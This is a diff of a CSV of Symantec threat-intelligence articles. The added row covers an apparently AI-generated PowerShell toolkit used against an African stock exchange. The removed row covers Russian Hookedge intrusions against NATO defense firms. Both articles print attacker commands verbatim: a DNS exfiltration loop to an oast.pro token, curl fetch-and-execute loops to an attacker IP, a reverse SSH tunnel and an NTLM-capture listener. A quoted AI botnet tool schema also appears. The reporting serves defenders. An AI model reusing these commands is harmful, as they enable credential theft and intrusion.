@@ -1,4 +1,123 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+6402c741468d,6402c741468d,2026-11-19 11:00 UTC,"Attacks, Breaches & Threat Intel",Broadcom / Symantec,Broadcom/Symantec Blog,AI Security; Identity Security Posture Management; Data Security Posture Management; Server & Workload Protection,Article,Major African Stock Exchange Targeted in AI-Assisted Attack,https://www.security.com/threat-intelligence/african-stock-exchange-ai-assisted-attack,"In those attacks the group exploited the ProxyShell and ProxyLogon vulnerabilities in public-facing Microsoft Exchange servers to install web shells, and it used a backdoor that...","What the commands revealed
+
+The commands used to run the modules give us an indication of what the attackers targeting this organization were interested in. In the modules’ commands, data is exfiltrated to a DNS server, and there's a sub-domain that changes according to what the command does – such as ‘spid1’ for Host and Process Enumeration and ‘awslocal1’ for Cloud and Devops Hunting, and so on. The functionalities of the modules included:
+
+Host and Process Enumeration (spid1, proc2, proc3, smbctx1, smbsc1): Collects the machine name, current user identity, mapped network drives, SMB connections, and running process trees (including parent processes and full command-line arguments via WMI).
+
+Cloud and DevOps Hunting (awslocal1): Searches for AWS CLI configurations, environment variables related to databases or secrets, and active processes for tools like Docker, Kubernetes, Terraform, Jenkins, and GitLab.
+
+Web Server (IIS) Profiling (iis1, iisa1, iisp2): Interrogates IIS using the WebAdministration module to map out local websites, application pools, physical disk paths, bindings, and pool identity users.
+
+Secret and Credential Scraping (cfg1, sites1, xpjs1, dep1, sysm1, sysh1, sysv2, gpp1, awsa1): Recursively scans local web roots, deployment directories (C:\Deployer), and the domain's SYSVOL network share. It specifically targets configuration files (.xml, .json, .env, web.config) looking for hardcoded passwords, Group Policy cpassword fields, AWS access keys, and database connection strings.
+
+Database Probing (rdsnet1, scq1): Attempts direct TCP connections to an AWS RDS PostgreSQL instance on port 5432 and uses integrated Windows authentication to query a Microsoft SQL Server for system user and version data.
+
+SharePoint and Source Code Enumeration (spf1, spl1, spd1, spd2, sps1, tfs1, tfs2): Loads the SharePoint PowerShell snap-in to iterate through all sites and document libraries, searching for files containing sensitive keywords like “aws”, “credential”, or “password”. It also queries Team Foundation Server (TFS) APIs for project lists.
+
+API Exploitation and Lateral Movement (api1, api2, map1, dbg1, adm1, admt1, adm2, keys1, key4, xtok1, cscs1, ipo1): Probes an internal API for debugging endpoints. It then attempts to authenticate to an admin endpoint using hardcoded credentials to extract JWT tokens. Finally, it uses extracted tokens and API keys to query authenticated endpoints for user profiles and banking data.
+
+SCCM Reconnaissance and Lateral-movement Targeting (cas1, wmi1, scq1, smbsc1): Queries the SCCM AdminService and WMI (SMS_R_System) to find which machine a given user, likely admin, last logged on to, and enumerates the SCCM server's shares.
+
+Harvested-credential Validation (keys1, key4, xtok1): Cycles through several harvested x-api-key values and a bearer token against the same endpoints to see which one works.
+
+Capital-markets Data Access (cscs1, ipo1): Queries critical endpoints for investor and market data
+
+Signs of AI authorship
+
+The case for AI authorship rests on how uniform the modules are. Each one opened with the same error-handling line, used the same outer try/catch, hex-encoded its output the same way and returned the same empty-output sentinel. The DNS exfiltration loop was copied byte for byte into all 41 modules. A programmer building a toolkit would normally write that function once, while a model asked for a standalone script each time has no reason to.
+
+Variable names were generic, and error handling was uniformly verbose. One module contained a progress variable that no other module had, as if a model had improved a single script in isolation during iterative prompting. Another submitted an invalid credential as a deliberate test. The pace was also consistent with automated tooling, with a new module starting every few seconds. The level of detail included in the commands is another tell-tale sign that AI was used:
+
+$ErrorActionPreference = 'SilentlyContinue' try { $a = [string]((& { $j=Start-Job -ScriptBlock {try{Get-WmiObject -ComputerName '<redacted>-SCCM.<redacted>.com' -Namespace 'root\sms\site_<redacted>' -Class SMS_R_System -Filter ""LastLogonUserName='<redacted>'"" -Property Name,LastLogonUserName,ResourceId -ErrorAction Stop|ForEach-Object{'NAME='+$_.Name+';USER='+$_.LastLogonUserName+';RID='+$_.ResourceId}}catch{'WMIERR='+$_.Exception.GetBaseException().Message}} if(Wait-Job $j -Timeout 18){Receive-Job $j}else{Stop-Job $j;'WMIERR=TIMEOUT'};Remove-Job $j -Force } | Out-String).Trim()) } catch { $a = 'ERR:' + $_.Exception.Message } $b = -join ([Text.Encoding]::UTF8.GetBytes($a) | ForEach-Object { $_.ToString('x2') }) if ($b.Length -eq 0) { $b = '454d505459' } for ($i = 0; $i -lt $b.Length; $i += 50) { $n = [Math]::Min(50, $b.Length - $i) $v = $b.Substring($i, $n) try { [Net.Dns]::GetHostAddresses(""$i.$v.wmi1.danoam334iqjo0ap2scg6ofosjxfgqhsa.oast.pro"") | Out-Null } catch {} }
+
+None of these signals is conclusive on its own, but taken together they fit AI-assisted or AI-generated authorship better than they fit bespoke attacker tooling. We could not identify which model may have been used.
+
+DNS exfiltration through a testing service
+
+Each module hex-encoded its output, split it into 50 hex character chunks and resolved a DNS name for each chunk. The names were unique subdomains of a single token under oast[.]pro, a public out-of-band testing service. The output would have left the server as DNS lookups rather than as web requests, and it would have been collected by whoever controlled the token. This is the exfiltration loop as it appeared in the modules:
+
+$b = -join ([Text.Encoding]::UTF8.GetBytes($a) | ForEach-Object { $_.ToString('x2') }) if ($b.Length -eq 0) { $b = '454d505459' } for ($i = 0; $i -lt $b.Length; $i += 50) { $n = [Math]::Min(50, $b.Length - $i) $v = $b.Substring($i, $n) try { [Net.Dns]::GetHostAddresses(""$i.$v.<module>.<token>.oast[.]pro"") | Out-Null } catch {} }
+
+This is an unusual technique and may have been an additional attempt by the actors involved in this activity to stay under the radar and avoid detection.
+
+Witchetty and the attribution question
+
+Witchetty was first documented by ESET in April 2022 as one of three sub-groups of TA410, a cyberespionage operation with some links to the Cicada (aka APT10) group. In September 2022, we reported on Witchetty attacks carried out between February and September of that year against two governments in the Middle East and this same African stock exchange. In those attacks the group exploited the ProxyShell and ProxyLogon vulnerabilities in public-facing Microsoft Exchange servers to install web shells, and it used a backdoor that hid its payload in an image.
+
+Six persistence implants were present on the server in April 2026, and one of the Witchetty implants was first seen in 2020. The toolkit was different. It was modular and focused on cloud secrets and financial APIs, and it ran from a web shell under the IIS worker process, which suggests that a vulnerability may have been exploited to gain access. Web shells on public-facing servers featured in the 2022 Witchetty attacks, but the focus on cloud secrets and financial APIs differs from the Witchetty activity we have seen in earlier cases. For that reason, we treat the implants and the toolkit separately.
+
+Three explanations fit the evidence. Witchetty may have returned with new tooling. A second and more capable operator may have used the access that Witchetty established. Or an unrelated actor may have used the same compromise. We could not rule out any of them.
+
+Significance
+
+The toolkit is notable for how it was produced as much as for what it did. If the modules were generated by a model, an operator could produce 41 purpose-built scripts for one target without writing the shared plumbing by hand, and run them in a little over three minutes. The uniformity that points to AI authorship also gives defenders something to look for, since the same scaffold and exfiltration loop appeared in every module.
+
+The targets of the credential tests were the exchange's own investment API and a securities depository gateway. We found no evidence of privilege escalation or data theft, and the results of the modules went to a collector that we cannot see. Whether any credentials or keys worked, and what the attackers intended to do with them, remains unknown. However, the targeting of a financial institution like a stock exchange is in itself significant and does seem to follow with the ongoing trend of attackers focusing on financial organizations, while now also using AI to carry out these attacks.
+
+Protection
+
+For the latest protection updates, please visit the Symantec Protection Bulletin.
+
+If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.
+
+Indicators of Compromise
+
+File indicators
+
+8940de2ada979ad2c53ece0b5cb84100c4df0a024b4b363e96cb6a67469e30d5 - Mimikatz
+
+5c4f6e21877dfd71e3e95254c6193457e9aab10aca7459ddaeb6d711997190de - Loader
+
+982750f4f9edd2ef51b9972a1018a8777bd9d65e0d2e43977a522bdc73ddef5f – Persistence implant that hijacks the Avast wsc_proxy component
+
+1363534d205ad60f6700d81f2af2c0ce6d959b73fd405adbb598072395bd26e5 – Persistence implant (ShellcodeLoader)
+
+0ad7e39ce6b9b7637a002c352637089f6ccf8ae39206a7d895266b21ca26ff0f – RC4-encrypted loader
+
+2e223e3c6dc7a130f0281a6c608cd58c153ec026c020c8a661b60a1e285140bf – Utility that base64-encodes beacon.bin, XORs it with 0x53 and writes Default.xml
+
+5a2f093f7ae25c5e381647549496acf375e18dd95263b921518e340ee78e5377 – DLL loader that runs only inside svchost, decrypts WindowsUpdate.xml with XOR 0x53 and maps the payload in memory
+
+b1155f47910f032217352c3a302c01de4d15cabda34331d2866f5d7a52b3ecde – Similar loader, host process svchost.exe
+
+b737eae170534f5965b90f4af807cb3f728498f3bccc9355a0afc0171e413230 – Similar loader, host process svchost.exe
+
+5fd9a352d1bec4a11134ee140aa278d07d720b45493a7f01a548293f412972ce – Similar loader, host process svchost.exe
+
+242c411cd415d55e67aae75759e5c07720fcdddc0378b5e35d4c1e4ab2b01eb8 – Similar loader, host process svchost.exe
+
+af3737ba032b8c5d3403064899ab6cc48610a397d9f67b626f99b2f0f5082202 – Similar loader, host process VSPerfCmd.exe
+
+6b3061d6e042744bb484b725031e7916b31ad224318a8c0441b9ead14ab853d5 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory
+
+9b4dadaa55479727f7c0034ff9c07165597b9a9a9376b6e564634eeaf1c6b876 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory
+
+d732660db5af253aacbc580d6114d59d233c48b3a5ead6dcfcb55246252abed2 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory
+
+85e75e78a545d2fe11ac19385cc8c0789e1056a2cd4edfec32a6a6b113001e5a – Loader that decodes mfeann.log and injects it as x64 shellcode
+
+1c1704d789332c4d6ce57139d27194ac64c27bfbb1368f1006ffc3c96f3bcb80 – Nim-compiled DLL impersonating VSPMsg.dll, loader for Msg.log
+
+3ca9d65046420592e726776bb26b08719721d108f6947fd22af1d5e7cac33edc – Cobalt Strike beacon
+
+30dc80cb4c791d80eb21597232fb2f5a4111bf3dfad32c736b789d77127310ef – Cobalt Strike beacon
+
+152c125eacdacc69406b120afd95994eef0f7a0cd638c2d8723e64f79344a336 – Cobalt Strike beacon
+
+8129e103509f00f40a6a2740b76bc3f9449ac09cd9222ba289e52e86f31f616e – Cobalt Strike beacon
+
+26dc22c99e5e88363818e56dc5883258f048e426c9aa515887bf5d06872782f9 – Not available for analysis
+
+53ddb6c51aca4bd6b00ed83a8019ee1440351f8eeb95a7b6c74a2b75210d85b2 – Not available for analysis
+
+af295b5081ccdfd601a0aaecaa81fe1aa92125b548063863dbca2011cef658ce – Not available for analysis0f2c40d31887418de304ca182afb4f4fecfe95937068f11fc798778c2ca95e3f – mfeann.exe
+
+002ce0d28ec990aadbbc89df457189de37d8adaadc9c084b78eb7be9a9820c81 – vsperfcmd.exe
+
+Network IOCs
+
+danoam334iqjo0ap2scg6ofosjxfgqhsa[.]oast[.]pro"
 f28ec1324dd9,99d6c260eab2,2026-11-18 11:39 UTC,Vulnerabilities & Patching,Broadcom / Symantec,Broadcom/Symantec Blog,Vulnerability Management; Identity Security Posture Management,Article,Java4Shell: Critical OpenJDK Flaw Allows Unauthenticated Remote Code Execution,https://www.security.com/threat-intelligence/java4shell-cve2026114938-patch-now,"2 (Critical), according to Calif, which discovered the flaw, and 8","Key findings
 
 CVE-2026-114938, which has been dubbed Java4Shell, is a critical heap overflow in the Base64 decoder of the OpenJDK HotSpot Java Virtual Machine (JVM) on x86-64. It has a Common Vulnerability Scoring System (CVSS) v4.0 score of 9.2 (Critical), according to Calif, which discovered the flaw, and 8.1 (High) on CVSS 3.1 per OpenJDK's advisory.
@@ -797,170 +916,3 @@ None of the tool calls in the captured request were run by the honeypot. The req
 Two of the 74 tool definitions, abridged
 
 {""name"": ""ssrf_exploit"", ""description"": ""Exploit SSRF to access cloud metadata, internal ports, or local files."", ""parameters"": {""url"": ""string"", ""vulnerable_endpoint"": ""string""}}{""name"": ""c2_operator_start"", ""description"": ""Launch autonomous AI botnet operator for continuous FOFA scanning and infection."", ""parameters"": {""mission"": ""string""}}"
-5524c9326fc8,5524c9326fc8,2026-10-20 10:00 UTC,"Policy, Legal & Compliance",Broadcom / Symantec,Broadcom/Symantec Blog,Server & Workload Protection; Endpoint Security; File Security,Article,Swallowtail: Russian Espionage Group Targets Defense Firms in Two NATO Countries,https://www.security.com/threat-intelligence/swallowtail-russia-nato-targets,"Targeting The Hookedge backdoor used in these attacks was first documented by Recorded Future's Insikt Group, which tracks the group as BlueDelta, in August 2026","Tooling and tradecraft
-
-Hookedge is delivered through macro-enabled Word documents and communicates entirely through the webhook.site service, using it to stage tasks and to receive their output. Infected hosts fetch tasks using a hidden, off-screen instance of the Microsoft Edge browser rather than a conventional downloader.
-
-At the target where the Threat Hunter Team discovered the most extensive follow-up activity, a second-stage Hookedge component abandoned webhook.site in favor of a dedicated IP address operated by the attackers, used for both tasking and exfiltration.
-
-The attackers used two distinct credential-theft techniques. In one, they pushed an SSH private key onto the compromised host and immediately used it to open an SSH connection back to their own server, requesting a persistent, backgrounded tunnel that would give them a route from their infrastructure into the target's internal network.
-
-In the other, they ran a short, self-contained PowerShell script that stands up a listener on the host's own loopback address and forces the machine to authenticate to it, capturing the resulting NTLM handshake. Both techniques are detailed in the attack chain below.
-
-An undocumented reflective loader
-
-The attackers also deployed a previously undocumented tool (file name: ld.exe). It is a reflective loader, run with an encrypted file and a decryption key supplied as command-line arguments. It decrypts the file in memory and calls an exported function named ExecuteLoader. Threat Hunter recovered the specific key and encrypted-payload filename used in one execution of this tool, but the payload itself was not recovered, so its ultimate function is unknown.
-
-Attack chain: Intrusion against a naval shipbuilder
-
-In the attack against the naval shipbuilder, the initial infection vector was a malicious Word document, which served as the dropper for the Hookedge backdoor. On the afternoon of July 24, 2026, the document was opened directly from the Outlook attachment cache, confirming it arrived as a received email attachment.
-
-The document contained a heavily obfuscated macro that split its VBA source and written strings into short fragments joined at runtime, a technique used to defeat static antivirus scanning. Once executed, the AutoOpen routine dropped four files into the user's profile to initiate the Hookedge infection chain: a VBScript launcher, an HTML/XHTML pair designed to auto-submit a hidden form to a webhook endpoint as soon as it loaded, and a batch script.
-
-The batch script first killed any running instance of the Microsoft Edge browser and deleted stale download artefacts, then launched a new, effectively invisible Edge window sized to a single pixel and positioned off-screen, passing it an inline, base64-encoded JavaScript payload rather than a URL:
-
-taskkill /f /im msedge.exedel /q /f ""%userprofile%\Downloads\*.000""del /q /f ""%userprofile%\Downloads\*.tmp""del /q /f ""%userprofile%\Downloads\*.crdownload""start """" msedge.exe --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors ""data:text/html;base64,<encoded JavaScript>""
-
-Decoded, the JavaScript simply fetched a resource from a webhook.site endpoint and forced the hidden browser to save the response to disk under the same identifier, using the browser itself as an HTTP client rather than a conventional downloader:
-
-fetch('https://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000') .then(r => r.blob()) .then(blob => { /* save as 890efd8d-....000 via an auto-clicked <a download> link */ })
-
-After a short pause the batch script located the downloaded file, copied its contents into a new .cmd file, executed it, and uploaded the output back to the same webhook endpoint before deleting the temporary files. This is the delivery-and-callback loop that both requests instructions from a webhook.site endpoint and separately reports the results of running them.
-
-The downloaded task, run a couple of minutes after the document was opened, was a single large reconnaissance batch. It began with a canary request to the same webhook.site endpoint, then probed outbound connectivity to a set of well-known cloud services and a hard-coded IP address:
-
-curl http://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000curl -k https://dl.dropboxusercontent.com | find /i ""<title>""curl -k https://accounts.google.com | find /i ""<title>""curl -k https://login.microsoftonline.comcurl -k https://mega.nz/file | find /i ""<title>""curl -k https://example.comcurl http://example.comcurl http://23.220.75.245
-
-It then queried the host's proxy and WPAD configuration, before running a standard discovery sweep: the current logged-on sessions, full IP configuration, system information, running processes, and directory listings of the user's profile, Downloads, Desktop, Documents and both Program Files folders. Probing reachability to Dropbox, Google, Microsoft's login portal and Mega alongside a bare IP address suggests the attackers were checking which outbound channels were available to them on this network. This was possibly a precursor to choosing where to stage further payloads or exfiltrate data, before deciding whether the host was worth escalating against.
-
-There was then a gap of about three days. On the morning of July 27, a new copy of the same generic Hookedge VBS launcher appeared under a fresh, randomly generated filename but with the same file hash as before. This was followed shortly afterwards by a second, more capable batch script. Unlike the first stage, this script fetched its next task directly from a hard-coded IP address rather than from webhook.site:
-
-set outfile=<random>.cmdcurl -k -o %outfile% https://185.82.218.119:443/53379b62-8020-41cf-af57-effa6e1e8506start 53379b62-8020-41cf-af57-effa6e1e8506.vbs %outfile%
-
-From this point on, every task fetched from that IP address arrived wrapped in the same short template: a POST to the operators' server acknowledging receipt, the operator's actual command running with its output captured to a file, that file uploaded back to the same server, and the temporary files deleted:
-
-chcp 65001curl -k -X POST https://185.82.218.119:443/53379b62-8020-41cf-af57-effa6e1e8506 -d ""del %0"" (<command> echo 53379b62-8020-41cf-af57-effa6e1e8506) >> <random-output-file> 2>&1curl -k --data-binary @<random-output-file> -H ""Content-Type: text/plain; charset=utf-8"" https://185.82.218.119:443/5b73dc69-d765-4440-a4d2-e9eb33283eb9 del /q /f 5b73dc69-d765-4440-a4d2-e9eb33283eb9*
-
-The identifier 53379b62 names the second-stage installer and its scheduled task, while 5b73dc69 identifies the command-and-control session used to fetch each individual task and upload its result. Over the following 30 seconds, seven tasks were issued in quick succession, each one arriving, executing and reporting back within two-to-eight seconds of the last, a cadence consistent with an operator working interactively rather than a fixed polling timer. The first was a simple identity check:
-
-whoami
-
-The next set of commands moved straight into credential-material staging. The operators had a file pushed down through the same fetch-and-rename pattern used for tasking. This file was renamed to id_rsa once downloaded, and then adjusted its permissions on a named local account before listing the directory to confirm the change had taken effect:
-
-curl -k -o <file> https://185.82.218.119:443/5b73dc69-... ren <file> id_rsa dir C:\ProgramDataicacls C:\ProgramData\Adobe\id_rsa /setowner ""<domain>\<user>"" echo Y|cacls C:\ProgramData\Adobe\id_rsa /G ""<domain>\<user>:F""
-
-With that private key in place, the operators immediately used it to open an outbound SSH connection to their own server, disabling host-key checking and forcing legacy RSA algorithms so the connection would succeed regardless of the target's default SSH client configuration:
-
-C:\Windows\System32\OpenSSH\ssh.exe -i C:\ProgramData\Adobe\id_rsa -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -p 80 root@185.82.218.119 -R 185.82.218.119:48097 -Nf
-
-The -R flag requests a remote port forward back through the tunnel to the operators' own server, the bare port number (rather than a host:port pair) requests a dynamic, SOCKS-style forward; -N means the session carries no interactive shell, only the forward; and -f backgrounds the process once authentication succeeds. Together this establishes a persistent, backgrounded tunnel that gives the operators a route from their own infrastructure back into the target's internal network through the compromised host, rather than a one-off remote-access session. A DNS lookup of another internal hostname followed immediately afterwards, suggesting the tunnel was being used, or tested, for reconnaissance of the internal network almost as soon as it came up.
-
-A few hours later, the operators ran a ping and a DNS lookup against one further internal hostname, then a ping against a second, continuing to map out names on the target's internal network.
-
-Following this, the operators deployed a credential-theft technique distinct from the SSH tunnel: a PowerShell script that stands up a fake web server on the loopback address and forces the host to authenticate to itself over SMB, in order to capture the resulting NTLM handshake.
-
-$listener = New-Object System.Net.HttpListener $listener.Prefixes.Add('http://localhost:8080/')$listener.Start()Start-Job -ScriptBlock { net use f: \\localhost@8080\c$ }while ($true) { # respond 401 + WWW-Authenticate: NTLM, capture up to 4 Authorization headers }
-
-The script pre-built a fixed NTLM Type-2 challenge, then relied on the `net use` command in the background job to make the local machine authenticate to its own listener over what looks like an SMB-over-HTTP share. Each such NTLM handshake yields an NTLMv2 challenge/response pair; from that pair an attacker can attempt offline cracking of the current user's or machine account's password hash, or relay it to authenticate to another host on the network as that account. The script was configured to capture up to four authentication attempts before stopping. This is a self-capture technique in the same family as tools like Responder or ntlmrelayx, implemented here as a short, self-contained PowerShell script rather than a purpose-built credential-theft binary.
-
-Immediately afterwards, the operators looked up a third internal hostname, then ran a short privilege and group-membership check:
-
-whoami /allnet groupsnet group Administrators ipconfig /all
-
-The next day, July 28, the operators resumed activity with DNS lookups of two more internal hostnames, one of which appeared from its name to be a mail server, followed by a combined inventory command covering the host's general configuration, running processes and installed patches:
-
-systeminfo && tasklist && wmic qfe get HotFixID InstalledOn Description
-
-A few hours later, the operators killed the ssh.exe process:
-
-taskkill /f /t /im ssh.exe
-
-This ended the tunnel established the day before; whether it was closed as routine operational hygiene, to rotate to a fresh session, or because the tunnel was no longer needed at that point is not clear from the available data.
-
-Beaconing to the same command-and-control session continued through July 29 and into the morning of July 31, in short bursts every few hours, without any further distinct commands appearing in the available data until the morning of July 31. At that point the operators pushed down two more files through the same fetch-and-rename pattern used for the SSH key: one renamed to ld.exe, the other to Events.dat.
-
-curl -k -o <file> https://185.82.218.119:443/...ren <file> ld.exe curl -k -o <file> https://185.82.218.119:443/...ren <file> Events.dat
-
-ld.exe (SHA256: f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff) had in fact already been staged on the host from the previous afternoon. It was then run directly, with both its decryption key and the path to the encrypted file supplied as command-line arguments:
-
-C:\ProgramData\ld.exe DE063CF3F2E2A83E7B1A277C052A340E C:\ProgramData\Events.dat
-
-Analysis of ld.exe found it to be a reflective loader: it takes an encrypted file and a key as arguments, decrypts the file in memory, and calls an exported function named ExecuteLoader. The decrypted content begins with the four-byte marker ADSA (0x41534441). Events.dat, the specific encrypted file supplied in this run, was not recovered, so what it ultimately decrypts to and executes is unknown. The command line does, however, resolve two things that were previously open questions: the name of the encrypted payload file and the decryption key used to unlock it on this host.
-
-The burst closed with one further identity check:
-
-net user
-
-This is the last distinct operator command present in the available data. The infrastructure itself, however, remained active well beyond this point: the same ld.exe hash and the same generic VBS launcher were both still present on the host roughly four weeks later, in late August, and the launcher was observed once more on September 24, the most recent activity. Whether this reflects the original scheduled task continuing to fire and simply finding no new tasking most of the time, or renewed operator interest at those later dates, cannot be determined from the data available.
-
-Broad campaign targeting governments and defense
-
-The targeting in this campaign spans two NATO member states and three distinct sectors of national security relevance: law enforcement, defense manufacturing and shipbuilding. That breadth, combined with the timing identified in Recorded Future's report, is consistent with a collection effort tasked broadly against European government and defense targets rather than a single focused operation.
-
-The tradecraft observed after initial access, credential theft through two independent techniques, a persistent network tunnel, and a previously undocumented loader, goes beyond the delivery mechanism that has so far been publicly reported on this campaign.
-
-Organizations that identify Hookedge indicators in their environment should treat the intrusion as potentially ongoing rather than concluded and should look for the credential-theft and tunneling activity described here rather than assuming the backdoor's installation was the extent of the attackers' activity.
-
-Protection
-
-If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.
-
-Indicators of Compromise
-
-File indicators
-
-4a43aacffc2d8d76f7abac729238779b6c99b10ee09f54c2cea1654a91561303 – Hookedge dropper
-
-e068794cf43e381b26c82d746cca107b9f84327a2a8308d5b87ea5529963c4c8 – Hookedge dropper
-
-e8be50171436550e1edd8b4946d2adc0870e97465f67526ea252bff0815abcbe – Hookedge dropper
-
-60ef547ebd2f4252e286db762980481b0da23dcd2c84465509735544c0a9c2b3 – Hookedge dropper
-
-1bb1b27e1695c726c7c1d3d4935f9318afc6f5fd9015d7cf3890f0eb7bf8d47e – Hookedge dropper
-
-a3b44405112e6364447e5d96630edfabcf81e5ad37d690c3ebc73770d62aeabd – Hookedge dropper
-
-6678049918dda2d5859de0a95e0573fec9496c62bbe72967ae0d3deeb5bda68f – Hookedge dropper
-
-c2c9187033d22d7944ea9298461a0ac693ef2774b4ce08b0955d2aba3646fb44 – Hookedge dropper
-
-ea525336b787c2fd3dbc4b3e9a3a78f71004e1bd43e2e1ed953edad51118cb72 – Hookedge dropper
-
-5709e5e1496410d4b9ac5a3bd8be3ec4595f881b4865ebf6e490784b56105645 – Hookedge dropper
-
-49e276498fc4e7d65ebf9fa2acf64ec2a0c25e75ac621cd6a203d64fb75aa495 – Hookedge dropper
-
-39d21c1b8ab2f08c75a1cb7d18433a8b207c71ec1d266bb049b54b7eaf01d67b – Hookedge dropper
-
-1bff55104206d3f55cd72ca58ffecd2fa620a428c5a3c6987d3c4cc68285d335 – Hookedge dropper
-
-e94402a9886d4433ccad0ced0cd4f22d055d1f0f7e4155dbec992433eb94e00c – Hookedge dropper
-
-2fceca3460a35eea2b21c47d73c27c27edae95d2ae29ffb4ec2222d1a223b4bd – Hookedge dropper
-
-68613e232d0893e61ad29906daee2312bd4c4e940f4d0c9e702e7c35a256d0f7 – Hookedge dropper
-
-a92413d4951a28822ec85e5c0d1948d4160b91388c5f3d86504611fc286a4d13 – Hookedge dropper
-
-063930af6a4aad06d8f8aab43226bf6dcddd2c79aa505894ee95876cf9254543 – Hookedge VBS launcher
-
-d74c65e6d35d3b2a80686f059590f919316ecaf4ed539192e904d675ba5c7a40 – Hookedge VBS launcher
-
-aafbc096e20f259df9166f837d0baf7333f177e6f383ca7cb9215936ecbe7f5e – Hookedge VBS launcher
-
-f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff – ld.exe – reflective loader
-
-Network IOCs
-
-185.82.218[.]119
-
-hxxps://webhook[.]site/890efd8d-6e9e-428a-bcf9-987745d71000
-
-hxxps://webhook[.]site/53379b62-8020-41cf-af57-effa6e1e8506
-
-hxxps://webhook[.]site/5b73dc69-d765-4440-a4d2-e9eb33283eb9
-
-hxxps://webhook[.]site/d828b9fc-5435-4b1c-881f-d6350c11d0b6
-
-hxxps://webhook[.]site/ca3c058e-3c88-449b-8299-822cd5d5e17c"
